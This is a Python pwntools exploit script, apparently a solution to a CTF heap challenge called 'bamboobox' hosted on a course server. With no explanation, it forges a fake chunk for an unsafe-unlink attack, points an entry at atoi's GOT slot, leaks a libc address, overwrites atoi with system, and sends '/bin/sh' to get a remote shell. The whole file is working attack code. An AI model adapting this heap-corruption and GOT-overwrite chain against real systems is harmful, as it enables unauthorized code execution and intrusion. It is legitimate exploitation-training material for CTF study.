#!/usr/bin/env python 

from pwn import *
context.arch = 'amd64'

r = remote('csie.ctf.tw', 10138)
#r = process('./bamboobox')

def show():
    r.recvuntil(':')
    r.sendline('1')

def add(size, name):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(name)

def change(index, size, name):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(index))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(name)

def remove(index):
    r.recvuntil(':')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(index))


add(0x80, "a")
add(0x80, "a")
add(0x80, "a")

chunk = flat([0, 0x81, 0x6020d8-0x18, 0x6020d8-0x10, 'A'*0x60]) # prev, size, fd, bk
chunk += flat([0x80, 0x90]) # prev, size

change(1, 0x100, chunk)
remove(2)

atoi_got = 0x0602068
change(1, 0x100, p64(0) + p64(atoi_got))
show()


r.recvuntil('0 : ')
libc = u64(r.recvuntil("1")[:-1].ljust(8, '\x00')) - 0x36e80
system_addr = libc + 0x45390

print "libc:", hex(libc)

change(0, 0x100, p64(system_addr))
r.send('/bin/sh\x00')





r.interactive()
